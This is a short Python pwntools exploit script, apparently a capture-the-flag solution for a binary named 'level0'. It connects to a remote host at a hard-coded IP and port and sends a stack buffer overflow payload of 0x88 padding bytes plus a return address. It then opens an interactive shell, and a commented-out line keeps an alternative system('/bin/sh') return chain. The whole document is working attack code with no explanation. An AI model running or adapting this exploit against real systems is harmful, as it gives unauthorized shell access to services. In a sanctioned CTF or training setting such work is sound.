from pwn import *

#sh = process("./level0")

sh = remote('111.198.29.45',30437)

bin_sh = p64(0x00400684)

sys_addr = p64(0x00400460)

#payload = 'a' * 0x88 + sys_addr + 'aaaa' + bin_sh

payload = 'a' * 0x88 + p64(0x00400596)

sh.sendline(payload)

sh.interactive()
